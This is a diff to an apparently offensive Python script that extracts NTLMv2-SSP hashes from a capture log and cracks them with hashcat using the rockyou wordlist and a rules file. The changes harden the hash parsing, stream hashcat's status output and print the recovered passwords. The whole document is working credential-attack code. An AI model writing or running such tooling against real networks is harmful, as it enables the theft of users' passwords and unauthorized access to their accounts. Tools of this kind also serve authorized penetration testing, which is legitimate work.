@@ -57,6 +57,7 @@ import re
 import sys
 import os
 import hashlib
+import time
 from netaddr import IPNetwork
 
 def is_tool_installed(tool_name):
@@ -107,8 +108,12 @@ def extract_hashes():
         for line in log_file:
             if 'NTLMv2-SSP Hash' in line:
                 hash_line = line.strip()
-                ntlm_hash = re.search(r'(?<=NTLMv2-SSP Hash   : )(.*)', hash_line).group(0)
-                hashes.append(ntlm_hash)
+                match = re.search(r'NTLMv2-SSP Hash\s*:\s*(.*)', hash_line)
+                if match:
+                    ntlm_hash = match.group(1)
+                    hashes.append(ntlm_hash)
+                else:
+                    print(f"[-] No NTLMv2-SSP hash found in line: {line.strip()}")
     return hashes
 
 def crack_hash(net_ntlm_hash):
@@ -123,9 +128,35 @@ def crack_hash(net_ntlm_hash):
         hash_file,
         "rockyou.txt",  # Path to your wordlist
         "--rules-file", "one-rule-to-rule-them-all.rule",  # Path to your rules file
+        "--status",  # Enables status output
+        "--status-timer", "10"  # Update status every 10 seconds
+    ]
+    
+    hashcat_process = subprocess.Popen(hashcat_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    
+    try:
+        while True:
+            line = hashcat_process.stdout.readline()
+            if not line:
+                break
+            print(line.strip())
+            if "Exhausted" in line or "Cracked" in line:
+                break
+            time.sleep(1)  # Sleep for a second before checking the next line
+        
+        hashcat_process.wait()
+    except KeyboardInterrupt:
+        hashcat_process.terminate()
+        print("[-] Hashcat process terminated by user.")
+    
+    # Show cracked passwords
+    show_command = [
+        "hashcat",
+        "-m", "5600",
+        hash_file,
         "--show"
     ]
-    result = subprocess.run(hashcat_command, capture_output=True, text=True)
+    result = subprocess.run(show_command, capture_output=True, text=True)
     cracked = result.stdout.strip().split(':')
     if len(cracked) > 2:
         password = cracked[2]
